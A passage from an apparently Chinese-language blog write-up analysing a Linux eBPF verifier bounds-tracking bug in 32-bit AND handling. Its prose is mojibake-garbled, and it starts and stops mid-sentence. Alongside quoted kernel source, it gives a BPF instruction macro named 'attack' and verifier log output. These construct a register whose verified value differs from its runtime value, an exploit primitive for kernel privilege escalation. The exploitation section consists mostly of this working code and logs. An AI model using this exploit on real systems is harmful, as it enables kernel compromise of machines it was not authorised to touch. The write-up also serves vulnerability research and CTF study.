.mask=0x100000000&#125;</code>ã€‚æ­¤æ—¶åœ¨<code>scalar32_min_max_and</code>å‡½æ•°ä¸­æ˜¯ä¼šç›´æ¥<code>return</code>çš„ï¼Œéšåç«‹é©¬è¿›å…¥<code>scalar_min_max_and</code>å‡½æ•°ä¸­ï¼Œå¹¶ä¸”å› ä¸º<code>dst_known = 0</code>å¯¼è‡´ä¸ä¼šè¿›å…¥<code>if</code>è¯­å¥ï¼Œè¿›å…¥ä¸‹é¢çš„æµç¨‹ã€‚æœ€ç»ˆä¼šè¿›å…¥åˆ°<code>scalar32_min_max_and</code>ä¸­ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __update_reg32_bounds(struct bpf_reg_state *reg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">var32_off</span> =</span> tnum_subreg(reg-&gt;var_off);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* min signed is max(sign bit) | min(other bits) */</span></span><br><span class="line">reg-&gt;s32_min_value = <span class="keyword">max_t</span>(s32, reg-&gt;s32_min_value,</span><br><span class="line">var32_off.value | (var32_off.mask &amp; S32_MIN));</span><br><span class="line"><span class="comment">/* max signed is min(sign bit) | max(other bits) */</span></span><br><span class="line">reg-&gt;s32_max_value = <span class="keyword">min_t</span>(s32, reg-&gt;s32_max_value,</span><br><span class="line">var32_off.value | (var32_off.mask &amp; S32_MAX));</span><br><span class="line">reg-&gt;u32_min_value = <span class="keyword">max_t</span>(u32, reg-&gt;u32_min_value, (u32)var32_off.value);</span><br><span class="line">reg-&gt;u32_max_value = min(reg-&gt;u32_max_value,</span><br><span class="line"> (u32)(var32_off.value | var32_off.mask));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __update_reg64_bounds(struct bpf_reg_state *reg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* min signed is max(sign bit) | min(other bits) */</span></span><br><span class="line">reg-&gt;smin_value = <span class="keyword">max_t</span>(s64, reg-&gt;smin_value,</span><br><span class="line">reg-&gt;var_off.value | (reg-&gt;var_off.mask &amp; S64_MIN));</span><br><span class="line"><span class="comment">/* max signed is min(sign bit) | max(other bits) */</span></span><br><span class="line">reg-&gt;smax_value = <span class="keyword">min_t</span>(s64, reg-&gt;smax_value,</span><br><span class="line">reg-&gt;var_off.value | (reg-&gt;var_off.mask &amp; S64_MAX));</span><br><span class="line">reg-&gt;umin_value = max(reg-&gt;umin_value, reg-&gt;var_off.value);</span><br><span class="line">reg-&gt;umax_value = min(reg-&gt;umax_value,</span><br><span class="line">      reg-&gt;var_off.value | reg-&gt;var_off.mask);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __update_reg_bounds(struct bpf_reg_state *reg)</span><br><span class="line">&#123;</span><br><span class="line">__update_reg32_bounds(reg);</span><br><span class="line">__update_reg64_bounds(reg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªå‡½æ•°å°±æ˜¯å¯¹<code>dst_reg</code>è¿›è¡Œäº†ä¸¤æ¬¡æ›´æ–°è¾¹ç•Œçš„æ•ˆæœï¼Œè¿™é‡Œä¸»è¦å…³æ³¨32ä½çš„å¤„ç†ã€‚é¦–å…ˆå°†æœ‰ç¬¦å·çš„æœ€å°å€¼èµ‹å€¼ä¸ºæœ‰ç¬¦å·çš„æœ€å°å€¼å’ŒçœŸå®å€¼ä¸­çš„æœ€å¤§å€¼ï¼Œç„¶åå°±æ˜¯å°†æœ‰ç¬¦å·çš„æœ€å¤§å€¼èµ‹å€¼ä¸ºæœ‰ç¬¦å·çš„æœ€å¤§å€¼å’ŒçœŸå®å€¼ä¸­æœ€å°å€¼ã€‚åé¢æ— ç¬¦å·å’Œä¸Šè¿°ç±»ä¼¼ã€‚</p><p>ä¾æ—§æŒ‰ç…§ä¸Šé¢çš„ä¾‹å­æ¥çœ‹ï¼Œå› ä¸ºåœ¨<code>scalar32_min_max_and</code>å‡½æ•°ä¸­å¹¶æ²¡æœ‰å¯¹32ä½çš„è¾¹ç•Œå€¼åšä»»ä½•åˆå§‹åŒ–æ‰€ä»¥æœ€ç»ˆçš„æ•ˆæœä¸ºæœ€å°è¾¹ç•Œå€¼ä¸º1ï¼Œæœ€å¤§è¾¹ç•Œå€¼ä¸º0ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> ___mark_reg_known(struct bpf_reg_state *reg, u64 imm)</span><br><span class="line">&#123;</span><br><span class="line">reg-&gt;var_off = tnum_const(imm);</span><br><span class="line">reg-&gt;smin_value = (s64)imm;</span><br><span class="line">reg-&gt;smax_value = (s64)imm;</span><br><span class="line">reg-&gt;umin_value = imm;</span><br><span class="line">reg-&gt;umax_value = imm;</span><br><span class="line"></span><br><span class="line">reg-&gt;s32_min_value = (s32)imm;</span><br><span class="line">reg-&gt;s32_max_value = (s32)imm;</span><br><span class="line">reg-&gt;u32_min_value = (u32)imm;</span><br><span class="line">reg-&gt;u32_max_value = (u32)imm;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Mark the unknown part of a register (variable offset or scalar value) as</span></span><br><span class="line"><span class="comment"> * known to have the value @imm.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __mark_reg_known(struct bpf_reg_state *reg, u64 imm)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* Clear id, off, and union(map_ptr, range) */</span></span><br><span class="line"><span class="built_in">memset</span>(((u8 *)reg) + <span class="keyword">sizeof</span>(reg-&gt;type), <span class="number">0</span>,</span><br><span class="line">       offsetof(struct bpf_reg_state, var_off) - <span class="keyword">sizeof</span>(reg-&gt;type));</span><br><span class="line">___mark_reg_known(reg, imm);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">adjust_reg_min_max_vals</span><span class="params">(struct bpf_verifier_env *env,</span></span></span><br><span class="line"><span class="params"><span class="function">   struct bpf_insn *insn)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">off_reg.type = SCALAR_VALUE;</span><br><span class="line">__mark_reg_known(&amp;off_reg, insn-&gt;imm);</span><br><span class="line">src_reg = &amp;off_reg;</span><br><span class="line"><span class="keyword">if</span> (ptr_reg) <span class="comment">/* pointer += K */</span></span><br><span class="line">  <span class="keyword">return</span> adjust_ptr_min_max_vals(env, insn,</span><br><span class="line">                                 ptr_reg, src_reg);</span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç å°±æ˜¯ç»™<code>src_reg</code>è¿›è¡Œäº†åˆå§‹åŒ–ï¼Œå¯ä»¥çœ‹åˆ°å…¶æœ‰ç¬¦å·æ— ç¬¦å·æœ€å¤§å€¼æœ€å°å€¼éƒ½è¢«èµ‹å€¼ä¸ºäº†1ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__update_reg_bounds(dst_reg);</span><br><span class="line">__reg_deduce_bounds(dst_reg);</span><br><span class="line">__reg_bound_offset(dst_reg);</span><br></pre></td></tr></table></figure><p>å¹¶ä¸”åœ¨<code>adjust_scalar_min_max_vals</code>å‡½æ•°çš„æœ«å°¾ä¼šè¿›è¡Œå¦‚ä¸‹æ“ä½œï¼Œé¦–å…ˆåˆä¼šæ‰§è¡Œ<code>__update_reg_bounds</code>å‡½æ•°æ›´æ–°ä¸€ä¸‹è¾¹ç•Œå€¼ï¼Œè®¡ç®—ä¸€ä¸‹ä¼šå‘ç°å…¶å®ç»“æœå¹¶ä¸ä¼šæ”¹å˜ã€‚ä¸è¿‡å¦‚æœæ­¤æ—¶æˆ‘ä»¬å†æ¬¡æ„é€ ä¸€ä¸ªæœ€å°è¾¹ç•Œå€¼ä¸º0ï¼Œæœ€å¤§è¾¹ç•Œå€¼ä¸º1ï¼Œå¹¶ä¸”è¿è¡Œæ—¶å€¼ä¸º0çš„å¯„å­˜å™¨ï¼Œå†è®©ä¸¤ä¸ªå¯„å­˜å™¨ç›¸åŠ ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">scalar32_min_max_add</span><span class="params">(struct bpf_reg_state *dst_reg,</span></span></span><br><span class="line"><span class="params"><span class="function"> struct bpf_reg_state *src_reg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">s32 smin_val = src_reg-&gt;s32_min_value;</span><br><span class="line">s32 smax_val = src_reg-&gt;s32_max_value;</span><br><span class="line">u32 umin_val = src_reg-&gt;u32_min_value;</span><br><span class="line">u32 umax_val = src_reg-&gt;u32_max_value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (signed_add32_overflows(dst_reg-&gt;s32_min_value, smin_val) ||</span><br><span class="line">    signed_add32_overflows(dst_reg-&gt;s32_max_value, smax_val)) &#123;</span><br><span class="line">dst_reg-&gt;s32_min_value = S32_MIN;</span><br><span class="line">dst_reg-&gt;s32_max_value = S32_MAX;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">dst_reg-&gt;s32_min_value += smin_val;</span><br><span class="line">dst_reg-&gt;s32_max_value += smax_val;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (dst_reg-&gt;u32_min_value + umin_val &lt; umin_val ||</span><br><span class="line">    dst_reg-&gt;u32_max_value + umax_val &lt; umax_val) &#123;</span><br><span class="line">dst_reg-&gt;u32_min_value = <span class="number">0</span>;</span><br><span class="line">dst_reg-&gt;u32_max_value = U32_MAX;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">dst_reg-&gt;u32_min_value += umin_val;</span><br><span class="line">dst_reg-&gt;u32_max_value += umax_val;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ™ä¼šè¿›å…¥è¿™æ ·ä¸€ä¸ªå‡½æ•°ä¸­ï¼Œè®¡ç®—ä¸€ä¸‹ä¾¿ä¼šå‘ç°ä¸ä¼šå‡ºç°<code>overflow</code>çš„æƒ…å†µï¼Œæ‰€ä»¥èµ°çš„éƒ½æ˜¯elseï¼Œé‚£ä¹ˆåœ¨ç›¸åŠ ä¹‹å<code>dst_reg</code>çš„æœ€å¤§è¾¹ç•Œå€¼å’Œæœ€å°è¾¹ç•Œå€¼éƒ½ä¸º1äº†ã€‚æ­¤æ—¶å›åˆ°<code>adjust_scalar_min_max_vals</code>å‡½æ•°æ—¶åˆä¼šè°ƒç”¨<code>__reg_bound_offset</code>å‡½æ•°ï¼Œç„¶è€Œç»è¿‡è®¡ç®—å¯ä»¥å¾—åˆ°çš„æ˜¯ä»–ä¼šå°†å¯„å­˜å™¨çš„å€¼æ”¹ä¸º1ï¼Œé‚£ä¹ˆæ­¤æ—¶æˆ‘ä»¬å°±ç®—æˆåŠŸè·å¾—äº†ä¸€ä¸ªåœ¨è¿è¡Œæ—¶å¯„å­˜å™¨çš„å€¼ä¸º0ä½†æ˜¯åœ¨<code>verifier</code>ä¸­è®¤å®šå…¶å€¼ä¸º1çš„å¯„å­˜å™¨äº†ã€‚</p><h2 id="åˆ©ç”¨åˆ†æ"><a href="#åˆ©ç”¨åˆ†æ" class="headerlink" title="åˆ©ç”¨åˆ†æ"></a>åˆ©ç”¨åˆ†æ</h2><p>ä¸éš¾çœ‹å‡ºæ¥ç›®å‰çš„æƒ…å†µå°±å¾ˆç±»ä¼¼d3bpfäº†ï¼Œä¸è¿‡ç¨æœ‰ä¸åŒçš„æ˜¯è¿™é‡Œè¿è¡Œæ—¶å’Œ<code>verifier</code>ä¸­çš„å€¼å’Œé¢˜ç›®ä¸­çš„æ­£å¥½ç›¸åï¼Œä¸è¿‡æƒ³è¦æ„é€ æˆä¸€æ‘¸ä¸€æ ·çš„ä¹Ÿæ˜¯å¾ˆç®€å•çš„ï¼Œ<code>(reg + 1) &amp; 1</code>å³å¯æ„é€ å‡ºä¸€æ‘¸ä¸€æ ·çš„æƒ…å†µçš„äº†ã€‚</p><p>é¦–å…ˆé€šè¿‡ä¸Šè¿°åŠæ³•æ„é€ å‡ºæœ€å°è¾¹ç•Œå€¼ä¸º1ï¼Œæœ€å¤§è¾¹ç•Œå€¼ä¸º0çš„å¯„å­˜å™¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> attack(map_fd)                                                       \</span></span><br><span class="line"><span class="meta">    BPF_LD_MAP_FD(BPF_REG_1, map_fd),                                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),                               \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, 0),                        \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span></span><br><span class="line"><span class="meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                                     \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),                                 \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \</span></span><br><span class="line"><span class="meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_8, 0),                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_9, 0xffffffff),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_9, 32),                               \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_AND, BPF_REG_6, BPF_REG_9),                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_7, 0x1),                                       \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_7, 32),                               \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 2),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 0x1),                              \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_AND, BPF_REG_6, BPF_REG_7)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">19</span>: (<span class="number">5f</span>) r6 &amp;= r7</span><br><span class="line"><span class="number">20</span>: R0_w=invP0 R6_w=invP(id=<span class="number">0</span>,umax_value=<span class="number">4294967296</span>,var_off=(<span class="number">0x0</span>; <span class="number">0x100000000</span>),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">0</span>,u32_min_value=<span class="number">1</span>,u32_max_value=<span class="number">0</span>) R7_w=invP4294967298 R8_w=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">5376</span>,imm=<span class="number">0</span>) R9_w=invP<span class="number">-4294967296</span>m</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆæ ¹æ®å‰é¢çš„ç†è®ºå¯ä»¥å¾—åˆ°ä¸€ä¸‹å†…å®¹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> attack(map_fd)                                                       \</span></span><br><span class="line"><span class="meta">    BPF_LD_MAP_FD(BPF_REG_1, map_fd),                                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),                               \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, 0),                        \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span></span><br><span class="line"><span class="meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                                     \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),                                 \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \</span></span><br><span class="line"><span class="meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_8, 0),                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_9, 0xffffffff),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_9, 32),                               \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_AND, BPF_REG_6, BPF_REG_9),                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_7, 0x1),                                       \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_7, 32),                               \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 2),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 0x1),                              \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_AND, BPF_REG_6, BPF_REG_7),                        \</span></span><br><span class="line"><span class="meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_8, 0),                        \</span></span><br><span class="line"><span class="meta">        BPF_JMP32_IMM(BPF_JLE, BPF_REG_3, 1, 2),                             \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0x196082),                                  \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                                     \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_3),                        \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 0x1),                              \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_AND, BPF_REG_6, 0x1)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">20</span>: (<span class="number">79</span>) r3 = *(u64 *)(r8 +<span class="number">0</span>)</span><br><span class="line"> R0_w=invP0 R6_w=invP(id=<span class="number">0</span>,umax_value=<span class="number">4294967296</span>,var_off=(<span class="number">0x0</span>; <span class="number">0x100000000</span>),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">0</span>,u32_min_value=<span class="number">1</span>,u32_max_value=<span class="number">0</span>) R7_w=invP4294967298 R8_w=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">5376</span>,imm=<span class="number">0</span>) R9_w=invP<span class="number">-4294967296</span> R1=fp0 fp<span class="number">-8</span>=<span class="number">0000</span></span><br><span class="line"><span class="number">21</span>: R0_w=invP0 R3_w=invP(id=<span class="number">0</span>) R6_w=invP(id=<span class="number">0</span>,umax_value=<span class="number">4294967296</span>,var_off=(<span class="number">0x0</span>; <span class="number">0x100000000</span>),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">0</span>,u32_min_value=<span class="number">1</span>,u32_max_value=<span class="number">0</span>) R7_w=invP4294967298 R8_w=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">5376</span>,imm=<span class="number">0</span>) R9_winvP<span class="number">-4294967296</span> R10=fp0 fp<span class="number">-8</span>=<span class="number">0000</span></span><br><span class="line"><span class="number">21</span>: (b6) <span class="keyword">if</span> w3 &lt;= <span class="number">0x1</span> <span class="keyword">goto</span> pc+<span class="number">2</span> R0_w=invP0 R3_w=invP(id=<span class="number">0</span>,u32_min_value=<span class="number">2</span>) R6_w=invP(id=<span class="number">0</span>,umax_value=<span class="number">4294967296</span>,var_off=(<span class="number">0x0</span>; <span class="number">0x100000000</span>),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">0</span>,u32_min_value=<span class="number">1</span>,u32_max_value=<span class="number">0</span>) R7_w=invP4294967298 R8_w=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">537</span>,imm=<span class="number">0</span>) R9_w=invP<span class="number">-4294967296</span> R10=fp0 fp<span class="number">-8</span>=<span class="number">0000</span></span><br><span class="line"><span class="number">22</span>: R0_w=invP0 R3_w=invP(id=<span class="number">0</span>,u32_min_value=<span class="number">2</span>) R6_w=invP(id=<span class="number">0</span>,umax_value=<span class="number">4294967296</span>,var_off=(<span class="number">0x0</span>; <span class="number">0x100000000</span>),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">0</span>,u32_min_value=<span class="number">1</span>,u32_max_value=<span class="number">0</span>) R7_w=invP4294967298 R8_w=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">376</span>,imm=<span class="number">0</span>) R9_w=invP<span class="number">-4294967296</span> R10=fp0 fp<span class="number">-8</span>=<span class="number">0000</span></span><br><span class="line"><span class="number">22</span>: (b7) r0 = <span class="number">1663106</span></span><br><span class="line"><span class="number">23</span>: R0_w=invP1663106 R3_w=invP(id=<span class="number">0</span>,u32_min_value=<span class="number">2</span>) R6_w=invP(id=<span class="number">0</span>,umax_value=<span class="number">4294967296</span>,var_off=(<span class="number">0x0</span>; <span class="number">0x100000000</span>),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">0</span>,u32_min_value=<span class="number">1</span>,u32_max_value=<span class="number">0</span>) R7_w=invP4294967298 R8_w=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ksm4,vs=<span class="number">5376</span>,imm=<span class="number">0</span>) R9_w=invP<span class="number">-4294967296</span> R10=fp0 fp<span class="number">-8</span>=<span class="number">0000</span></span><br><span class="line"><span class="number">23</span>: (<span class="number">95</span>) <span class="built_in">exit</span></span><br><span class="line"><span class="number">24</span>: R0=invP0 R3=invP(id=<span class="number">0</span>,smax_value=<span class="number">9223372032559808513</span>,umax_value=<span class="number">18446744069414584321</span>,var_off=(<span class="number">0x0</span>; <span class="number">0xffffffff00000001</span>),s32_min_value=<span class="number">0</span>,s32_max_value=<span class="number">1</span>,u32_max_value=<span class="number">1</span>)R6=invP(id=<span class="number">0</span>,umax_value=<span class="number">4294967296</span>,var_off=(<span class="number">0x0</span>; <span class="number">0x10000000</span>),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">0</span>,u32_min_value=<span class="number">1</span>,u32_max_value=<span class="number">0</span>) R7=invP4294967298 R8=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">5376</span>,imm=<span class="number">0</span>) R9=invP<span class="number">-4294967296</span> R10=fp0 fp<span class="number">-8</span>=<span class="number">0000</span></span><br><span class="line"><span class="number">24</span>: (<span class="number">0f</span>) r6 += r3</span><br><span class="line"><span class="number">25</span>: R0=invP0 R3=invP(id=<span class="number">0</span>,smax_value=<span class="number">9223372032559808513</span>,umax_value=<span class="number">18446744069414584321</span>,var_off=(<span class="number">0x0</span>; <span class="number">0xffffffff00000001</span>),s32_min_value=<span class="number">0</span>,s32_max_value=<span class="number">1</span>,u32_max_value=<span class="number">1</span>)R6_w=invP(id=<span class="number">0</span>,smax_value=<span class="number">9223372032559808513</span>,umax_value=<span class="number">1446744069414584321</span>,var_off=(<span class="number">0x1</span>; <span class="number">0xffffffff00000000</span>),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">1</span>,u32_min_value=<span class="number">1</span>,u32_max_value=<span class="number">1</span>) R7=invP4294967298 R8=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">5376</span>,imm=<span class="number">0</span>) R9=invP<span class="number">-4294967296</span> R10=fp0 fp<span class="number">-8</span>=<span class="number">0000</span></span><br><span class="line"><span class="number">25</span>: (<span class="number">07</span>) r6 += <span class="number">1</span></span><br><span class="line"><span class="number">26</span>: R0=invP0 R3=invP(id=<span class="number">0</span>,smax_value=<span class="number">9223372032559808513</span>,umax_value=<span class="number">18446744069414584321</span>,var_off=(<span class="number">0x0</span>; <span class="number">0xffffffff00000001</span>),s32_min_value=<span class="number">0</span>,s32_max_value=<span class="number">1</span>,u32_max_value=<span class="number">1</span>) R6_w=invP(id=<span class="number">0</span>,smin_value=<span class="number">-9223372036854775806</span>,smax_value=<span class="number">223372032559808514</span>,umin_value=<span class="number">2</span>,umax_value=<span class="number">18446744069414584322</span>,var_off=(<span class="number">0x2</span>; <span class="number">0xffffffff00000000</span>),s32_min_value=<span class="number">2</span>,s32_max_value=<span class="number">2</span>,u32_max_value=<span class="number">2</span>) R7=invP4294967298 R8=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">5376</span>,imm=<span class="number">0</span>) R9=invP<span class="number">-4294967296</span> R1</span><br><span class="line"><span class="number">26</span>: (<span class="number">57</span>) r6 &amp;= <span class="number">1</span></span><br><span class="line"><span class="number">27</span>: R0=invP0 R3=invP(id=<span class="number">0</span>,smax_value=<span 